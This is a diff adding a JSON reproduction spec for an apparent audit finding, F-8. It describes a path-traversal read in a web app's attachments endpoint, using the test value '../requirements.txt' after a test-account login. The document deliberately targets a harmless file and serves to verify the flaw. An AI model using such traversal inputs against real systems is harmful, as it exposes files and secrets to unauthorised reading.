@@ -1,0 +1,5 @@
+{"finding": "F-8",
+ "description": "Read a file outside uploads/ (the app's own requirements.txt, harmless) through a ../ name.",
+ "steps": [{"name": "login as alice", "method": "POST", "path": "/login", "form": {"email": "alice@example.test", "password": "alice-test-pw"}, "expect_status": 302},
+   {"name": "read outside uploads", "method": "GET", "path": "/attachments", "params": {"name": "../requirements.txt"}}],
+ "proof": {"type": "marker_in_response", "step": "read outside uploads", "marker": "PyYAML==6.0.1"}}
